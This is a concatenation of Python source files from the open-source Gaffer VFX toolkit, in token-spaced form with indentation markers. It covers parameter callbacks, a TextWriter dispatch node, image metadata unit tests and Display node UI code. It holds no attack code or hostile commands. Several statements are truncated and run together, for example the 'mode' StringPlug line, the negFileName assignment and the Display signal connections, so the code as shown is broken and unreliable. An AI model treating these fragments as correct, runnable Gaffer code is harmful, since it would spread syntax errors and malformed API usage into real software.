#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
~~ import IECore \n 
\n 
class parameterChangedCallback ( IECore . Parameterised ) : \n 
\n 
~~~ def __init__ ( self ) : \n 
\n 
~~~ IECore . Parameterised . __init__ ( self , "" ) \n 
\n 
self . parameters ( ) . addParameters ( \n 
\n 
[ \n 
IECore . IntParameter ( \n 
"driver" , \n 
"" , \n 
0 \n 
) , \n 
\n 
IECore . IntParameter ( \n 
"driven" , \n 
"" , \n 
0 \n 
) , \n 
\n 
] , \n 
\n 
) \n 
\n 
self . changes = [ ] \n 
\n 
~~ def parameterChanged ( self , parameter ) : \n 
\n 
~~~ self . changes . append ( ( parameter , str ( parameter . getValue ( ) ) ) ) \n 
\n 
if parameter . isSame ( self . parameters ( ) [ "driver" ] ) : \n 
~~~ self . parameters ( ) [ "driven" ] . setNumericValue ( self . parameters ( ) [ "driver" ] . getNumericValue ( ) * 5 ) \n 
\n 
~~ ~~ ~~ IECore . registerRunTimeTyped ( parameterChangedCallback ) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2012, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
import GafferUI \n 
import GafferCortexUI \n 
\n 
class ToolParameterValueWidget ( GafferCortexUI . ParameterValueWidget ) : \n 
\n 
~~~ def __init__ ( self , parameterHandler , parenting = None ) : \n 
\n 
~~~ GafferCortexUI . ParameterValueWidget . __init__ ( \n 
self , \n 
GafferUI . ToolPlugValueWidget ( parameterHandler . plug ( ) ) , \n 
parameterHandler , \n 
parenting = parenting \n 
) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2014, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
~~ ~~ import os \n 
\n 
import IECore \n 
\n 
import Gaffer \n 
import GafferDispatch \n 
\n 
class TextWriter ( GafferDispatch . ExecutableNode ) : \n 
\n 
~~~ def __init__ ( self , name = "TextWriter" , requiresSequenceExecution = False ) : \n 
\n 
~~~ GafferDispatch . ExecutableNode . __init__ ( self , name ) \n 
\n 
self . __requiresSequenceExecution = requiresSequenceExecution \n 
\n 
self . addChild ( Gaffer . StringPlug ( "fileName" , Gaffer . Plug . Direction . In ) ) \n 
self . addChild ( Gaffer . StringPlug ( "mode" , defaultValue = "w" , direction = Gaffer . Plug . Direction . In self . addChild ( Gaffer . StringPlug ( "text" , Gaffer . Plug . Direction . In ) ) \n 
\n 
~~ def execute ( self ) : \n 
\n 
~~~ context = Gaffer . Context . current ( ) \n 
fileName = self [ "fileName" ] . getValue ( ) \n 
\n 
directory = os . path . dirname ( fileName ) \n 
if directory : \n 
~~~ try : \n 
~~~ os . makedirs ( directory ) \n 
~~ except OSError : \n 
# makedirs very unhelpfully raises an exception if \n 
# the directory already exists, but it might also \n 
# raise if it fails. we reraise only in the latter case. \n 
~~~ if not os . path . isdir ( directory ) : \n 
~~~ raise \n 
\n 
~~ ~~ ~~ text = self . __processText ( context ) \n 
with file ( fileName , self [ "mode" ] . getValue ( ) ) as f : \n 
~~~ f . write ( text ) \n 
\n 
~~ ~~ def executeSequence ( self , frames ) : \n 
\n 
~~~ if not self . __requiresSequenceExecution : \n 
~~~ GafferDispatch . ExecutableNode . executeSequence ( self , frames ) \n 
return \n 
\n 
~~ context = Gaffer . Context ( Gaffer . Context . current ( ) ) \n 
fileName = self [ "fileName" ] . getValue ( ) \n 
\n 
with file ( fileName , self [ "mode" ] . getValue ( ) ) as f : \n 
~~~ with context : \n 
~~~ for frame in frames : \n 
~~~ context . setFrame ( frame ) \n 
text = self . __processText ( context ) \n 
f . write ( text ) \n 
\n 
~~ ~~ ~~ ~~ def hash ( self , context ) : \n 
\n 
~~~ h = GafferDispatch . ExecutableNode . hash ( self , context ) \n 
h . append ( context . getFrame ( ) ) \n 
h . append ( context . get ( "textWriter:replace" , IECore . StringVectorData ( ) ) ) \n 
self [ "fileName" ] . hash ( h ) \n 
self [ "mode" ] . hash ( h ) \n 
self [ "text" ] . hash ( h ) \n 
\n 
return h \n 
\n 
~~ def requiresSequenceExecution ( self ) : \n 
\n 
~~~ return self . __requiresSequenceExecution \n 
\n 
~~ def __processText ( self , context ) : \n 
\n 
~~~ text = self [ "text" ] . getValue ( ) \n 
replace = context . get ( "textWriter:replace" , IECore . StringVectorData ( ) ) \n 
if replace and len ( replace ) == 2 : \n 
~~~ text = text . replace ( replace [ 0 ] , replace [ 1 ] ) \n 
\n 
~~ return text \n 
\n 
~~ ~~ IECore . registerRunTimeTyped ( TextWriter , typeName = "GafferDispatchTest::TextWriter" ) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2015, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
import os \n 
\n 
import IECore \n 
\n 
import Gaffer \n 
import GafferImage \n 
import GafferTest \n 
import GafferImageTest \n 
\n 
class CopyImageMetadataTest ( GafferImageTest . ImageTestCase ) : \n 
\n 
~~~ checkerFile = os . path . expandvars ( "$GAFFER_ROOT/python/GafferImageTest/images/checker.exr" ) \n 
\n 
def test ( self ) : \n 
\n 
~~~ r = GafferImage . ImageReader ( ) \n 
r [ "fileName" ] . setValue ( self . checkerFile ) \n 
inMetadata = r [ "out" ] [ "metadata" ] . getValue ( ) \n 
\n 
d = GafferImage . DeleteImageMetadata ( ) \n 
d [ "in" ] . setInput ( r [ "out" ] ) \n 
d [ "names" ] . setValue ( "*" ) \n 
\n 
m = GafferImage . CopyImageMetadata ( ) \n 
m [ "in" ] . setInput ( d [ "out" ] ) \n 
m [ "copyFrom" ] . setInput ( r [ "out" ] ) \n 
m [ "names" ] . setValue ( "" ) \n 
\n 
# check that the image is passed through \n 
\n 
metadata = m [ "out" ] [ "metadata" ] . getValue ( ) \n 
self . assertEqual ( m [ "out" ] [ "metadata" ] . getValue ( ) , IECore . CompoundObject ( ) ) \n 
self . assertEqual ( m [ "out" ] . image ( ) , d [ "out" ] . image ( ) ) \n 
\n 
# check that we can copy specific metadata \n 
\n 
m [ "names" ] . setValue ( "screen* compression" ) \n 
metadata = m [ "out" ] [ "metadata" ] . getValue ( ) \n 
expected = set ( [ "screenWindowWidth" , "screenWindowCenter" , "compression" ] ) \n 
self . assertEqual ( set ( metadata . keys ( ) ) , expected ) \n 
for key in metadata . keys ( ) : \n 
~~~ self . assertEqual ( metadata [ key ] , inMetadata [ key ] ) \n 
\n 
# check that we can invert the selection \n 
\n 
~~ m [ "invertNames" ] . setValue ( True ) \n 
metadata = m [ "out" ] [ "metadata" ] . getValue ( ) \n 
expected = set ( [ "PixelAspectRatio" , "oiio:ColorSpace" ] ) \n 
self . assertEqual ( set ( metadata . keys ( ) ) , expected ) \n 
for key in metadata . keys ( ) : \n 
~~~ self . assertEqual ( metadata [ key ] , inMetadata [ key ] ) \n 
\n 
~~ ~~ def testOverwrite ( self ) : \n 
\n 
~~~ r = GafferImage . ImageReader ( ) \n 
r [ "fileName" ] . setValue ( self . checkerFile ) \n 
inMetadata = r [ "out" ] [ "metadata" ] . getValue ( ) \n 
\n 
a = GafferImage . ImageMetadata ( ) \n 
a [ "metadata" ] . addMember ( "compression" , IECore . StringData ( "extraFancyCompressor" ) ) \n 
\n 
m = GafferImage . CopyImageMetadata ( ) \n 
m [ "in" ] . setInput ( r [ "out" ] ) \n 
m [ "copyFrom" ] . setInput ( a [ "out" ] ) \n 
\n 
# check that the image is passed through \n 
\n 
m [ "names" ] . setValue ( "" ) \n 
metadata = m [ "out" ] [ "metadata" ] . getValue ( ) \n 
self . assertEqual ( metadata [ "compression" ] , IECore . StringData ( "zips" ) ) \n 
self . assertEqual ( m [ "out" ] [ "metadata" ] . getValue ( ) , inMetadata ) \n 
self . assertEqual ( m [ "out" ] . image ( ) , r [ "out" ] . image ( ) ) \n 
\n 
# check that we can overwrite certain metadata \n 
\n 
m [ "names" ] . setValue ( "compression" ) \n 
metadata = m [ "out" ] [ "metadata" ] . getValue ( ) \n 
self . assertTrue ( "compression" in metadata . keys ( ) ) \n 
self . assertEqual ( metadata [ "compression" ] , IECore . StringData ( "extraFancyCompressor" ) ) \n 
\n 
~~ def testDirtyPropogation ( self ) : \n 
\n 
~~~ c = GafferImage . Constant ( ) \n 
r = GafferImage . ImageReader ( ) \n 
r [ "fileName" ] . setValue ( self . checkerFile ) \n 
inMetadata = r [ "out" ] [ "metadata" ] . getValue ( ) \n 
\n 
m = GafferImage . CopyImageMetadata ( ) \n 
m [ "in" ] . setInput ( c [ "out" ] ) \n 
m [ "copyFrom" ] . setInput ( r [ "out" ] ) \n 
\n 
cs = GafferTest . CapturingSlot ( m . plugDirtiedSignal ( ) ) \n 
\n 
m [ "copyFrom" ] . setInput ( c [ "out" ] ) \n 
self . assertTrue ( m [ "out" ] [ "metadata" ] in set ( e [ 0 ] for e in cs ) ) \n 
\n 
del cs [ : ] \n 
\n 
m [ "names" ] . setValue ( "test" ) \n 
self . assertTrue ( m [ "out" ] [ "metadata" ] in set ( e [ 0 ] for e in cs ) ) \n 
\n 
del cs [ : ] \n 
\n 
m [ "invertNames" ] . setValue ( True ) \n 
self . assertTrue ( m [ "out" ] [ "metadata" ] in set ( e [ 0 ] for e in cs ) ) \n 
\n 
~~ def testPassThrough ( self ) : \n 
\n 
~~~ c = GafferImage . Constant ( ) \n 
i = GafferImage . ImageReader ( ) \n 
i [ "fileName" ] . setValue ( self . checkerFile ) \n 
\n 
m = GafferImage . CopyImageMetadata ( ) \n 
m [ "in" ] . setInput ( i [ "out" ] ) \n 
m [ "names" ] . setValue ( "*" ) \n 
\n 
self . assertEqual ( i [ "out" ] [ "format" ] . hash ( ) , m [ "out" ] [ "format" ] . hash ( ) ) \n 
self . assertEqual ( i [ "out" ] [ "dataWindow" ] . hash ( ) , m [ "out" ] [ "dataWindow" ] . hash ( ) ) \n 
self . assertEqual ( i [ "out" ] [ "channelNames" ] . hash ( ) , m [ "out" ] [ "channelNames" ] . hash ( ) ) \n 
\n 
self . assertEqual ( i [ "out" ] [ "format" ] . getValue ( ) , m [ "out" ] [ "format" ] . getValue ( ) ) \n 
self . assertEqual ( i [ "out" ] [ "dataWindow" ] . getValue ( ) , m [ "out" ] [ "dataWindow" ] . getValue ( ) ) \n 
self . assertEqual ( i [ "out" ] [ "channelNames" ] . getValue ( ) , m [ "out" ] [ "channelNames" ] . getValue ( ) ) \n 
\n 
context = Gaffer . Context ( ) \n 
context [ "image:tileOrigin" ] = IECore . V2i ( 0 ) \n 
with context : \n 
~~~ for c in [ "G" , "B" , "A" ] : \n 
~~~ context [ "image:channelName" ] = c \n 
self . assertEqual ( i [ "out" ] [ "channelData" ] . hash ( ) , m [ "out" ] [ "channelData" ] . hash ( ) ) \n 
self . assertEqual ( i [ "out" ] [ "channelData" ] . getValue ( ) , m [ "out" ] [ "channelData" ] . getValue ( ) ) \n 
\n 
~~ ~~ ~~ ~~ if __name__ == "__main__" : \n 
~~~ unittest . main ( ) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2013-2015, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
~~ import os \n 
import unittest \n 
\n 
import IECore \n 
\n 
import Gaffer \n 
import GafferImage \n 
import GafferImageTest \n 
\n 
class ObjectToImageTest ( GafferImageTest . ImageTestCase ) : \n 
\n 
~~~ fileName = os . path . expandvars ( "$GAFFER_ROOT/python/GafferImageTest/images/checker.exr" ) \n 
negFileName = os . path . expandvars ( "$GAFFER_ROOT/python/GafferImageTest/images/checkerWithNegativeDataWindow.200x150.exr" \n 
def test ( self ) : \n 
\n 
~~~ i = IECore . Reader . create ( self . fileName ) . read ( ) \n 
\n 
n = GafferImage . ObjectToImage ( ) \n 
n [ "object" ] . setValue ( i ) \n 
\n 
self . assertEqual ( n [ "out" ] . image ( ) , i ) \n 
\n 
~~ def testImageWithANegativeDataWindow ( self ) : \n 
\n 
~~~ i = IECore . Reader . create ( self . negFileName ) . read ( ) \n 
\n 
n = GafferImage . ObjectToImage ( ) \n 
n [ "object" ] . setValue ( i ) \n 
\n 
self . assertEqual ( n [ "out" ] . image ( ) , i ) \n 
\n 
~~ def testHashVariesPerTileAndChannel ( self ) : \n 
\n 
~~~ n = GafferImage . ObjectToImage ( ) \n 
n [ "object" ] . setValue ( IECore . Reader . create ( self . fileName ) . read ( ) ) \n 
\n 
self . assertNotEqual ( \n 
n [ "out" ] . channelDataHash ( "R" , IECore . V2i ( 0 ) ) , \n 
n [ "out" ] . channelDataHash ( "G" , IECore . V2i ( 0 ) ) \n 
) \n 
\n 
self . assertNotEqual ( \n 
n [ "out" ] . channelDataHash ( "R" , IECore . V2i ( 0 ) ) , \n 
n [ "out" ] . channelDataHash ( "R" , IECore . V2i ( GafferImage . ImagePlug . tileSize ( ) ) ) \n 
) \n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ unittest . main ( ) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2012, John Haddon. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
~~ import threading \n 
\n 
import IECore \n 
\n 
import Gaffer \n 
import GafferUI \n 
\n 
import GafferImage \n 
\n 
__all__ = [ ] \n 
\n 
Gaffer . Metadata . registerNode ( \n 
\n 
GafferImage . Display , \n 
\n 
"description" , \n 
"""\n\tInteractively displays images as they are rendered.\n\n\tThis node runs a server on a background thread,\n\tallowing it to receive images from both local and\n\tremote render processes. To set up a render to\n\toutput to the Display node, use an Outputs node with\n\tan Interactive output configured to render to the\n\tsame port as is specified on the Display node.\n\t""" , \n 
\n 
plugs = { \n 
\n 
"port" : [ \n 
\n 
"description" , \n 
"""\n\t\t\tThe port number on which to run the display server.\n\t\t\tOutputs which specify this port number will appear\n\t\t\tin this node - use multiple nodes with different\n\t\t\tport numbers to receive multiple images at once.\n\t\t\t""" , \n 
\n 
] , \n 
\n 
} \n 
\n 
) \n 
\n 
########################################################################## \n 
# Code for triggering updates when data is received on a Display node \n 
########################################################################## \n 
\n 
\n 
# to trigger a plugDirtiedSignal on the main ui thread. This is necessary because the Display \n 
\n 
\n 
__plugsPendingUpdate = [ ] \n 
__plugsPendingUpdateLock = threading . Lock ( ) \n 
\n 
def __scheduleUpdate ( plug , force = False ) : \n 
\n 
~~~ if not force : \n 
~~~ global __plugsPendingUpdate \n 
global __plugsPendingUpdateLock \n 
with __plugsPendingUpdateLock : \n 
~~~ for p in __plugsPendingUpdate : \n 
~~~ if plug . isSame ( p ) : \n 
~~~ return \n 
\n 
~~ ~~ __plugsPendingUpdate . append ( plug ) \n 
\n 
~~ ~~ GafferUI . EventLoop . executeOnUIThread ( lambda : __update ( plug ) ) \n 
\n 
~~ def __update ( plug ) : \n 
\n 
\n 
# been deleted, so we always check if the node exists: \n 
\n 
~~~ node = plug . node ( ) \n 
if node : \n 
~~~ updateCountPlug = node [ "__updateCount" ] \n 
updateCountPlug . setValue ( updateCountPlug . getValue ( ) + 1 ) \n 
\n 
~~ global __plugsPendingUpdate \n 
global __plugsPendingUpdateLock \n 
with __plugsPendingUpdateLock : \n 
~~~ __plugsPendingUpdate = [ p for p in __plugsPendingUpdate if not p . isSame ( plug ) ] \n 
\n 
~~ ~~ __displayDataReceivedConnection = GafferImage . Display . dataReceivedSignal ( ) . connect ( __scheduleUpdate __displayImageReceivedConnection = GafferImage . Display . imageReceivedSignal ( ) . connect ( IECore . curry ( ########################################################################## \n 
# \n 
#  Copyright (c) 2012, John Haddon. All rights reserved. \n 
#  Copyright (c) 2012-2015, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
from _GafferImageUI import * \n 
\n 
import DisplayUI \n 
from FormatPlugValueWidget import FormatPlugValueWidget \n 
from ChannelMaskPlugValueWidget import ChannelMaskPlugValueWidget \n 
\n 
import OpenImageIOReaderUI \n 
import ImageReaderUI \n 
import ImageViewToolbar \n 
import ImageTransformUI \n 
import ConstantUI \n 
import ImageSwitchUI \n 
import ColorSpaceUI \n 
import ImageContextVariablesUI \n 
import ImageStatsUI \n 
import DeleteChannelsUI \n 
import ObjectToImageUI \n 
import ClampUI \n 
import ImageWriterUI \n 
import GradeUI \n 
import ImageTimeWarpUI \n 
import ImageSamplerUI \n 
import MergeUI \n 
import ImageNodeUI \n 
import ChannelDataProcessorUI \n 
import ImageProcessorUI \n 
import ImageMetadataUI \n 
import DeleteImageMetadataUI \n 
import CopyImageMetadataUI \n 
import ImageLoopUI \n 
import ShuffleUI \n 
import PremultiplyUI \n 
import UnpremultiplyUI \n 
import CropUI \n 
import ResizeUI \n 
import ResampleUI \n 
import LUTUI \n 
import CDLUI \n 
import DisplayTransformUI \n 
import OffsetUI \n 
import BlurUI \n 
import ShapeUI \n 
import TextUI \n 
import WarpUI \n 
import UVWarpUI \n 
\n 
__import__ ( "IECore" ) . loadConfig ( "GAFFER_STARTUP_PATHS" , { } , subdirectory = "GafferImageUI" ) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2013, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
import os \n 
import unittest \n 
\n 
import IECore \n 
\n 
import Gaffer \n 
import GafferTest \n 
import GafferScene \n 
import GafferSceneTest \n 
import GafferRenderMan \n 
